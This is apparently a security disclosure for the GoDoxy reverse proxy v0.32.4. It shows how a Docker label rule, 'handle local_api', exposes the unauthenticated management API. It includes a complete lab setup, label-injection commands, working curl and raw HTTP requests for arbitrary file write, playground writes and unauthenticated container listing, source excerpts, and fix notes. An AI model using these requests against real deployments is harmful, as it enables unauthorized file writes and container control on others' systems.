### Vulnerability details

**Official website / Product:** https://docs.godoxy.dev / https://github.com/yusing/godoxy

**Repository:** yusing/godoxy (stars at selection: 4170)

**Vulnerability type:** RCE (unauthenticated management API via `handle local_api` rule / Docker label injection → arbitrary file write + container control)

**Vulnerability versions:** v0.32.4 (image `ghcr.io/yusing/godoxy:v0.32.4`; commit `0fea315c3e2b1f0a4bfc8247c77af168f818925e`); `RegisterHandlers` still registers `local_api` with `requireAuth: false` as a public rule handler on audited HEAD of this tag

**Vulnerability URL / Parameter:** Public reverse-proxy listener (lab `127.0.0.1:18902`) after a Docker label / provider rule installs `do: handle local_api` on an alias (lab Host `evil-localapi.localhost`). Unauthenticated `PUT /api/v1/file/content?type=provider&filename=...` (also `POST /api/v1/route/playground`, `GET /api/v1/docker/containers`, docker start/stop)

**Complex:** yes

### Verification procedure

1. Prepare the lab stack in any working directory, pinning images **`ghcr.io/yusing/godoxy:v0.32.4`** + **`ghcr.io/yusing/socket-proxy:latest`**. Create mount dirs and write the files below:

```bash
mkdir -p config logs data certs error_pages
```

`compose.yml` (based on upstream `compose.example.yml`, with lab-matching container names):

```yaml
services:
  socket-proxy:
    container_name: godoxy-r9a2-socket-proxy
    image: ghcr.io/yusing/socket-proxy:latest
    environment:
      - ALLOW_START=1
      - ALLOW_STOP=1
      - ALLOW_RESTARTS=1
      - CONTAINERS=1
      - EVENTS=1
      - INFO=1
      - PING=1
      - POST=1
      - VERSION=1
    volumes:
      - ${DOCKER_SOCKET:?set DOCKER_SOCKET in .env}:/var/run/docker.sock
    restart: unless-stopped
    tmpfs:
      - /run
    ports:
      - ${LISTEN_ADDR:?set LISTEN_ADDR in .env}:2375
  app:
    image: ghcr.io/yusing/godoxy:${TAG:?set TAG in .env}
    container_name: godoxy-r9a2-app
    restart: always
    network_mode: host
    env_file: .env
    environment:
      - GODOXY_DOCKER_HOST=${GODOXY_DOCKER_HOST:?set GODOXY_DOCKER_HOST in .env}
    user: ${GODOXY_UID:?set GODOXY_UID in .env}:${GODOXY_GID:?set GODOXY_GID in .env}
    depends_on:
      socket-proxy:
        condition: service_started
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - all
    cap_add:
      - NET_BIND_SERVICE
    volumes:
      - ./config:/app/config
      - ./logs:/app/logs
      - ./error_pages:/app/error_pages:ro
      - ./data:/app/data
      - ./certs:/app/certs
```

`.env` (lab-verified):

```env
TAG=v0.32.4
DOCKER_SOCKET=/var/run/docker.sock
LISTEN_ADDR=127.0.0.1:12375
GODOXY_DOCKER_HOST=tcp://127.0.0.1:12375
GODOXY_HTTP_ADDR=127.0.0.1:18902
GODOXY_API_ADDR=127.0.0.1:18912
GODOXY_API_USER=admin
GODOXY_API_PASSWORD=adminpass
GODOXY_API_JWT_SECURE=false
GODOXY_UID=1000
GODOXY_GID=1000
```

(`GODOXY_UID`/`GODOXY_GID` must be able to write the mounts; `admin`/`adminpass` are for the main API only; **not used on the unauth exploit path**.)

`config/config.yml` (enable the Docker provider so container labels are parsed):

```yaml
providers:
  docker:
    local: $DOCKER_HOST

webui:
  display_name: GoDoxy
  aliases:
    - godoxy

timeout_shutdown: 5
```

Then start:

```bash
docker compose up -d
```

After bring-up, `docker ps` shows:

```text
NAMES                      IMAGE                                STATUS         PORTS
godoxy-r9a2-app            ghcr.io/yusing/godoxy:v0.32.4        Up ...
godoxy-r9a2-socket-proxy   ghcr.io/yusing/socket-proxy:latest   Up ...         127.0.0.1:12375->2375/tcp
```

2. Start a container whose labels inject an alias + rule `handle local_api` (no GoDoxy login):

```bash
docker run -d --name godoxy-r9a2-label-inject \
  --label 'proxy.aliases=evil-localapi' \
  --label 'proxy.evil-localapi.port=80' \
  --label $'proxy.evil-localapi.rules=- name: leak\n  on: path glob(/*)\n  do: handle local_api\n' \
  traefik/whoami:v1.10.1
```

Relevant labels after inject:

```json
{
  "proxy.aliases": "evil-localapi",
  "proxy.evil-localapi.port": "80",
  "proxy.evil-localapi.rules": "- name: leak\n  on: path glob(/*)\n  do: handle local_api\n"
}
```

3. Wait until GoDoxy logs `added Traefik (evil-localapi)` (or an equivalent route-added line).
4. Send the unauthenticated `PUT /api/v1/file/content` below to **TCP `127.0.0.1:18902`** with Host override `evil-localapi.localhost` (no Cookie / CSRF). Equivalent curl:

```bash
curl -sS -X PUT 'http://127.0.0.1:18902/api/v1/file/content?type=provider&filename=label-inject-final.yml' \
  -H 'Host: evil-localapi.localhost' -H 'Content-Type: text/plain' \
  --data-binary $'label-inject-final:\n  scheme: http\n  host: 127.0.0.1\n  port: 9\n  alias: label-inject-final.localhost\n'
```

5. Observe HTTP **200** `{"message":"file set"}` and file `config/label-inject-final.yml` created on the GoDoxy volume. Optional: same Host `POST /api/v1/route/playground` with a `log info /app/data/...` rule writes an arbitrary file; `GET /api/v1/docker/containers` lists Docker inventory without auth. Contrast: `:18912` main API still requires `admin`/`adminpass`.

Confirm the provider file write on the host:

```bash
cat config/label-inject-final.yml
# expected:
# label-inject-final:
#   scheme: http
#   host: 127.0.0.1
#   port: 9
#   alias: label-inject-final.localhost
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
PUT /api/v1/file/content?type=provider&filename=label-inject-final.yml HTTP/1.0
Host: evil-localapi.localhost
Content-Type: text/plain
Content-Length: 101
User-Agent: r9-a2-poc
Accept: */*

label-inject-final:
  scheme: http
  host: 127.0.0.1
  port: 9
  alias: label-inject-final.localhost
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.0 200 OK
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 180
Cache-Control: no-cache, no-store, must-revalidate
Content-Security-Policy: object-src 'self'; frame-ancestors 'self';
Content-Type: application/json; charset=utf-8
Expires: 0
Pragma: no-cache
Referrer-Policy: same-origin
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Date: Sun, 01 Nov 2026 12:43:56 GMT

{"message":"file set"}
```

Optional: unauthenticated playground arbitrary file write (same Host, TCP `127.0.0.1:18902`):

```http
POST /api/v1/route/playground HTTP/1.1
Host: evil-localapi.localhost
Content-Type: application/json
Content-Length: 195
Connection: close
User-Agent: r9-a2-poc
Accept: application/json

{"rules": "- name: w\n  on: path /\n  do: log info /app/data/TMP-r9a2-1-PROOF \"R9A2_LOCALAPI_ARBITRARY_WRITE\"\n", "mockRequest": {"method": "GET", "path": "/", "host": "x"}, "mockResponse": {}}
```

Complete HTTP response (Docker-verified; chunked body expanded):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 180
Cache-Control: no-cache, no-store, must-revalidate
Content-Security-Policy: object-src 'self'; frame-ancestors 'self';
Content-Type: application/json; charset=utf-8
Expires: 0
Pragma: no-cache
Referrer-Policy: same-origin
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Date: Sun, 01 Nov 2026 12:43:32 GMT
Connection: close

{"parsedRules":[{"name":"w","on":"path /","do":"log info /app/data/TMP-r9a2-1-PROOF \"R9A2_LOCALAPI_ARBITRARY_WRITE\""}],"matchedRules":["w"],"finalRequest":{"method":"GET","path":"/","host":"x","headers":{},"query":{},"body":""},"finalResponse":{"statusCode":200,"headers":{},"body":""},"upstreamCalled":true}
```

Confirm the playground write on the host:

```bash
cat data/TMP-r9a2-1-PROOF
# expected:
# R9A2_LOCALAPI_ARBITRARY_WRITE
```

Optional: unauthenticated Docker inventory on the same Host:

```http
GET /api/v1/docker/containers HTTP/1.1
Host: evil-localapi.localhost
Accept: */*
```

Response is a JSON array of live containers (matching `docker ps`), for example:

```text
NAMES                      IMAGE                                STATUS
godoxy-r9a2-label-inject   traefik/whoami:v1.10.1               Up ...
godoxy-r9a2-app            ghcr.io/yusing/godoxy:v0.32.4        Up ...
godoxy-r9a2-socket-proxy   ghcr.io/yusing/socket-proxy:latest   Up ...
```

Verification result notes (lab impact summary):

```text
label container: godoxy-r9a2-label-inject with proxy.*.rules handle local_api
file write: config/label-inject-final.yml
playground write: R9A2_LOCALAPI_ARBITRARY_WRITE
docker containers unauth: OK
```

- Unauthenticated `PUT` created `config/label-inject-final.yml` on the mounted volume with the submitted YAML; response `{"message":"file set"}`.
- Follow-up unauthenticated playground `log info /app/data/TMP-r9a2-1-PROOF "R9A2_LOCALAPI_ARBITRARY_WRITE"` created that file with body `R9A2_LOCALAPI_ARBITRARY_WRITE`.
- Unauthenticated `GET /api/v1/docker/containers` on the same Host returned the live container inventory (including `godoxy-r9a2-app` and sibling lab containers).
- Main authenticated API on `:18912` still requires login (`admin`/`adminpass`); the bypass is specifically the public proxy route that `handle local_api` attaches.

### Vulnerability analysis

GoDoxy registers two Gin engines as named rule handlers: `api` (`requireAuth: true`) and `local_api` (`requireAuth: false`). The dedicated `GODOXY_LOCAL_API_ADDR` listener was hardened in v0.28 to loopback-only (unless an explicit insecure opt-in is set). However, the same unauthenticated engine remains reachable through the rule DSL command `handle local_api` on **any** HTTP route served by the shared reverse-proxy entrypoint (`GODOXY_HTTP_ADDR`).

Docker provider labels (`proxy.<alias>.rules`) are parsed into route rules without restricting handler names. A container (or malicious image `LABEL`) can therefore publish an alias whose rules terminate with `handle local_api`. Any client that can hit the proxy with that alias Host/path then exercises the full management API without JWT/CSRF: config/provider file write, rule playground (which opens/writes real log paths), Docker start/stop/list, agent APIs, etc. That is unexpected relative to the documented local-API loopback gate and is not the intentional authenticated WebUI/admin `handle api` path.

Trigger / sink source (full path and line numbers):

```go
# File: internal/api/handler.go
# Lines: 183-207
func RegisterHandlers() error {
	specs := [...]struct {
		name        string
		requireAuth bool
	}{
		{name: "api", requireAuth: true},
		{name: "local_api", requireAuth: false},
	}

	for _, spec := range specs {
		if _, exists := rules.GetHandler(spec.name); exists {
			return fmt.Errorf("api rule handler %q is already registered", spec.name)
		}
	}

	for i, spec := range specs {
		if rules.RegisterHandler(spec.name, NewHandler(spec.requireAuth)) {
			continue
		}
		for _, registered := range specs[:i] {
			rules.ReplaceHandler(registered.name, nil)
		}
		return fmt.Errorf("register API rule handler %q", spec.name)
	}
	return nil
}
```

```go
# File: internal/route/rules/do.go
# Lines: 268-277
		build: func(args any) HandlerFunc {
			name := args.(string)
			return func(w *httputils.ResponseModifier, r *http.Request, upstream http.HandlerFunc) error {
				handler, ok := GetHandler(name)
				if !ok {
					return fmt.Errorf("handler %q not found", name)
				}
				handler.ServeHTTP(w, r)
				return errTerminateRule
			}
```

### Fix notes

- Do **not** register `local_api` as a `rules.RegisterHandler` target usable from route YAML/Docker labels. Keep the unauthenticated engine only on the dedicated loopback `GODOXY_LOCAL_API_ADDR` server.
- Alternatively, deny `handle local_api` (and any `requireAuth:false` handler) when building rules for non-loopback entrypoints / Docker/file providers.
- Treat Docker label `rules` that reference privileged handlers as a trust boundary; reject or require explicit admin allow-list.
